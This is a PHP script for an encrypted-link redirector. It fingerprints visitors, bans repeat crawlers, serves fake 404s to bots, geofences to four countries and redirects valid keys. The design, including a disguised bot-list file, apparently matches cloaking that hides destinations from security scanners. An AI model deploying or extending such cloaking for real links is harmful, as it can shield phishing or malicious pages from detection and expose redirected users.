<?php
session_start();

define('BOT_LIST_FILE', './x/style.txt');
define('BOT_LOG_FILE', './x/bots.txt');
define('ACCESS_LOG_FILE', './x/access.log');
define('BAN_FILE', './x/banned_ips.txt');
define('BAN_FP_FILE', './x/banned_FP.txt');
define('MIN_DELAY_MS', 300);
define('MAX_KEYS_PER_FP', 50);
define('IP_BAN_THRESHOLD', 10);
define('ALLOWED_COUNTRIES', ['US', 'CA', 'GB', "AU"]);

$config = json_decode(file_get_contents('./x/config.json'), true);
define('SECRET_KEY', hex2bin($config['secret_key']));
$links = $config['links'];

$clientIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$accept = $_SERVER['HTTP_ACCEPT'] ?? '';
$fingerprint = hash('sha256', $clientIP . $userAgent . $accept);

foreach ([BOT_LIST_FILE, BOT_LOG_FILE, ACCESS_LOG_FILE, BAN_FILE, BAN_FP_FILE] as $file) {
    if (!file_exists($file)) file_put_contents($file, '');
}

if (!isset($_SESSION['attempts'])) $_SESSION['attempts'] = [];
if (!isset($_SESSION['attempts'][$fingerprint])) $_SESSION['attempts'][$fingerprint] = 0;


if (isIpBanned($clientIP) || isFpBanned($fingerprint)) {
    logAccess($clientIP, 'BANNED', $userAgent, null, $fingerprint);
    http_response_code(403);
    exit("Access Denied");
}

$botAgents = getBotAgents();
if (isBot($userAgent, $botAgents)) {
    $_SESSION['attempts'][$fingerprint]++;
    logAccess($clientIP, 'BOT_DETECTED', $userAgent, null, $fingerprint);
    file_put_contents(BOT_LOG_FILE, date('Y-m-d H:i:s') . " | {$clientIP} | {$userAgent}\n", FILE_APPEND);
    if ($_SESSION['attempts'][$fingerprint] >= IP_BAN_THRESHOLD) {
        banIp($clientIP);
        banFingerprint($fingerprint);
    }
    http_response_code(404);
    exit("Not Found");
}

if (!geoAllowed($clientIP)) {
    logAccess($clientIP, 'GEO_BLOCKED', $userAgent, null, $fingerprint);
    http_response_code(403);
    exit("Geo-blocked");
}

if ($_SESSION['attempts'][$fingerprint] >= MAX_KEYS_PER_FP) {
    logAccess($clientIP, 'RATE_LIMITED', $userAgent, null, $fingerprint);
    http_response_code(429);
    exit("Too many requests");
}


$key = $_GET['l'] ?? '';
$decryptedKey = decryptUrl($key, SECRET_KEY);

if (!validateKey($decryptedKey, $links)) {
    $_SESSION['attempts'][$fingerprint]++;
    logAccess($clientIP, 'INVALID_KEY', $userAgent, $decryptedKey, $fingerprint);
    http_response_code(404);
    exit("Not Found");
}

usleep(rand(MIN_DELAY_MS * 1000, (MIN_DELAY_MS + 100) * 1000));
logAccess($clientIP, 'REDIRECT', $userAgent, $decryptedKey, $fingerprint);
header("Location: " . $links[$decryptedKey]['url'], true, 302);
exit;

function encryptUrl($url, $key) {
    $iv = random_bytes(16);
    $cipher = openssl_encrypt($url, 'AES-256-CBC', $key, 0, $iv);
    return base64_encode($iv . $cipher);
}

function decryptUrl($data, $key) {
    $raw = base64_decode($data);
    $iv = substr($raw, 0, 16);
    $ciphertext = substr($raw, 16);
    return openssl_decrypt($ciphertext, 'AES-256-CBC', $key, 0, $iv);
}

function getBotAgents() {
    static $cached = null;
    if ($cached === null) {
        $cached = file_exists(BOT_LIST_FILE) ? file(BOT_LIST_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
        $cached = array_map('strtolower', $cached);
    }
    return $cached;
}

function isBot($ua, $bots) {
    if (empty($ua)) return true;
    foreach ($bots as $bot) if (strpos($ua, $bot) !== false) return true;
    return preg_match('/bot|crawl|slurp|spider|mediapartners/i', $ua);
}

function validateKey($key, $links) {
    if (!isset($links[$key])) return false;
    $link = $links[$key];
    if (!$link['active']) return false;
    if ($link['expires'] && time() > strtotime($link['expires'])) return false;
    return true;
}

function logAccess($ip, $type, $ua, $key = null, $fp = null) {
    $log = sprintf("[%s] %s | %s | %s | %s | %s\n",
        date('Y-m-d H:i:s'), $ip, $type, $key ?? 'null', $fp ?? 'null',
        substr(str_replace(["\n", "\r"], '', $ua), 0, 200)
    );
    file_put_contents(ACCESS_LOG_FILE, $log, FILE_APPEND | LOCK_EX);
}

function isIpBanned($ip) {
    return in_array($ip, file(BAN_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
}

function isFpBanned($fp) {
    return in_array($fp, file(BAN_FP_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
}

function banIp($ip) {
    file_put_contents(BAN_FILE, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function banFingerprint($fp) {
    file_put_contents(BAN_FP_FILE, $fp . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function geoAllowed($ip) {
    $response = @file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode");
    if (!$response) return false;
    $data = json_decode($response, true);
    return in_array($data['countryCode'] ?? '', ALLOWED_COUNTRIES);
}
?>